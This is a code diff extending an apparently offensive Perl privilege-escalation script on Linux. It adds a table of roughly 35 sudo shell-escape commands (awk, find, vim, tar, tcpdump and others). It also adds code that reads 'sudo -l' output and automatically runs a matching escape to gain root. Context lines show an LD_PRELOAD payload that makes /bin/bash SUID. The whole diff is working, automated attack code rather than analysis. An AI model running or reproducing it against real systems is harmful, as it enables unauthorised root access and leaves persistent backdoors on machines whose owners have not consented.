@@ -314,6 +314,45 @@ sub exploit_docker {
     return 1;
 }
 
+# ===== SUDO GTFOBINS =====
+my %SUDO_ABUSE = (
+    "ash"     => "ash",
+    "awk"     => q{awk 'BEGIN {system("/bin/sh -p")}'},
+    "bash"    => "bash -p",
+    "busybox" => "busybox sh -p",
+    "cp"      => "cp /bin/sh /tmp/.sh; chmod +s /tmp/.sh; /tmp/.sh -p",
+    "csh"     => "csh -c 'exec /bin/sh -p'",
+    "dash"    => "dash -c 'exec /bin/sh -p'",
+    "find"    => "find . -exec /bin/sh -p \\; -quit",
+    "gdb"     => "gdb -nx -ex '!sh -p' -ex quit",
+    "git"     => "git -p help config 2>/dev/null; !/bin/sh -p",
+    "less"    => "less /etc/passwd; !/bin/sh -p",
+    "lua"     => "lua -e 'os.execute(\"/bin/sh -p\")'",
+    "man"     => "man -P 'sh -p' man 2>/dev/null",
+    "more"    => "more /etc/passwd; !/bin/sh -p",
+    "nano"    => "nano -s /bin/sh -c 'exec /bin/sh -p'",
+    "nice"    => "nice /bin/sh -p",
+    "nohup"   => "nohup /bin/sh -p",
+    "perl"    => "perl -e 'exec \"/bin/sh\", \"-p\"'",
+    "php"     => q{php -r 'system("/bin/sh -p");'},
+    "python"  => "python -c 'import pty; pty.spawn(\"/bin/sh -p\")'",
+    "python3" => "python3 -c 'import pty; pty.spawn(\"/bin/sh -p\")'",
+    "ruby"    => "ruby -e 'exec \"/bin/sh\", \"-p\"'",
+    "rsync"   => "rsync -e 'sh -p -c \"sh -p 0<&2 1>&2\"' 127.0.0.1:/dev/null",
+    "script"  => "script -qc /bin/sh /dev/null",
+    "socat"   => "socat - EXEC:'sh -p',pty,stderr,setsid,sigint,sane",
+    "ssh"     => "ssh -o ProxyCommand=';sh -p 0<&2 1>&2' x",
+    "systemctl" => "systemctl status -- '-p;sh -p 0<&2 1>&2 #'",
+    "tar"     => "tar -cf - /dev/null | tar -xf - --to-command='/bin/sh -p'",
+    "taskset" => "taskset 1 /bin/sh -p",
+    "tcpdump" => "tcpdump -i lo -G 1 -z '/bin/sh -p' -w /dev/null 2>/dev/null",
+    "tee"     => "tee /dev/null <<< '' 2>/dev/null",
+    "timeout" => "timeout 1 /bin/sh -p",
+    "vim"     => "vim -c ':!sh -p' -c ':q!' /dev/null 2>/dev/null",
+    "watch"   => "watch -x sh -c 'sh -p' 2>/dev/null",
+    "zsh"     => "zsh -c 'exec zsh'",
+);
+
 # ===== EXPLOIT: Sudo -l =====
 sub exploit_sudo {
     my $sudo_list = sys_cmd("timeout 2 sudo -l 2>/dev/null");
@@ -343,6 +382,26 @@ void _init() { unsetenv("LD_PRELOAD"); setuid(0); system("chmod +s /bin/bash"); 
         try_suid_bash();
         droproot();
         return 1;
+    }
+
+    # Parse ALLOWED commands and match against SUDO_ABUSE
+    while ($sudo_list =~ /\(ALL\)\s+NOPASSWD:\s*(\S[\s\S]*?)(?=\n\s*\(|\n\n|\Z)/g) {
+        my $cmds = $1;
+        my @binaries = split /\s*,\s*/, $cmds;
+        for my $bin_path (@binaries) {
+            $bin_path =~ s/^\s+//;
+            my $bin_name = (split /\//, $bin_path)[-1];
+            $bin_name =~ s/\s.*//;
+            if (exists $SUDO_ABUSE{$bin_name}) {
+                print "${G}[+] Exploitable sudo: $bin_name ($bin_path)${Z}\n";
+                my $cmd = "sudo -n " . $SUDO_ABUSE{$bin_name};
+                print "${C}[*] Running: $cmd${Z}\n";
+                sys_cmd($cmd);
+                try_suid_bash();
+                droproot();
+                return 1 if isroot();
+            }
+        }
     }
     return 0;
 }
